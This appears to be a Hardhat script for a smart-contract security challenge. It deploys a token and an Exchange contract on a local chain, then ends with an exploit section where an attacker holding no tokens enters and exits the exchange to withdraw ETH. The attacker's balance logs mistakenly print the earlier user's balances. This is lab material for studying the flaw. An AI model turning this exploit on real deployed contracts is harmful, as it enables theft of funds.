const { expect } = require("chai");
const { ethers } = require("hardhat");

const ONE_ETHER = ethers.utils.parseUnits("1", "ether");
const FIFTY_ETHER = ethers.utils.parseUnits("50", "ether");

async function deploy(deployer) {
    let deployTokens = ethers.utils.parseUnits("1000", "ether");

    // Deploy ERC20 token
    const StokenERC20 = await ethers.getContractFactory("StokenERC20", deployer);
    const stoken = await StokenERC20.deploy(deployTokens);
    await expect(await stoken.connect(deployer).balanceOf(deployer.address)).to.equal(deployTokens);

    // Deploy Exchange contract
    const Exchange = await ethers.getContractFactory("Exchange", deployer);
    const exchange = await Exchange.deploy(stoken.address, { value: FIFTY_ETHER.mul(5) });
    await expect(await exchange.token()).to.equal(stoken.address);
    await expect(await ethers.provider.getBalance(exchange.address)).to.equal(FIFTY_ETHER.mul(5));

    return [stoken, exchange];
}

async function main() {
    console.log("CHALLENGE - 1\n")
    let [deployer, user1, user2, attacker] = await ethers.getSigners();
    let [stoken, exchange] = await deploy(deployer);

    await stoken.connect(deployer).transfer(user1.address, FIFTY_ETHER);
    await stoken.connect(deployer).transfer(user2.address, FIFTY_ETHER);

    console.log("ERC20 token :", stoken.address);
    console.log("EXCHANGE contract :", exchange.address);

    // Normal user: Holding 50 tokens
    console.log("\n Normal Workflow: \n");

    let userBeforeBal = await ethers.provider.getBalance(user1.address);
    console.log("token balance of {user1} :", await ethers.utils.formatEther(await stoken.balanceOf(user1.address)));
    console.log("Before: ETH BALANCE {user1} :", await ethers.utils.formatEther(userBeforeBal));

    await exchange.connect(user1).enter(FIFTY_ETHER);
    await expect(await exchange.balanceOf(user1.address)).to.equal(FIFTY_ETHER);
    await exchange.connect(user1).exit(FIFTY_ETHER);

    let userAfterBal = await ethers.provider.getBalance(user1.address);
    console.log("After: ETH Balance {user1} :", await ethers.utils.formatEther(userAfterBal));

    // Attacker user: Holding 0 tokens : Exploit

    console.log("\nEXPLOIT: \n");

    let attackerBeforeBal = await ethers.provider.getBalance(attacker.address);
    console.log("token balance of {attacker} :", await ethers.utils.formatEther(await stoken.balanceOf(attacker.address)));
    console.log("Before: ETH Balance {attacker} :", await ethers.utils.formatEther(userBeforeBal));

    await exchange.connect(attacker).enter(FIFTY_ETHER);
    await expect(await exchange.balanceOf(attacker.address)).to.equal(FIFTY_ETHER);
    await exchange.connect(attacker).exit(FIFTY_ETHER);

    let attackerAfterBal = await ethers.provider.getBalance(attacker.address);
    console.log("After: ETH Balance {attacker} :", await ethers.utils.formatEther(userAfterBal));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
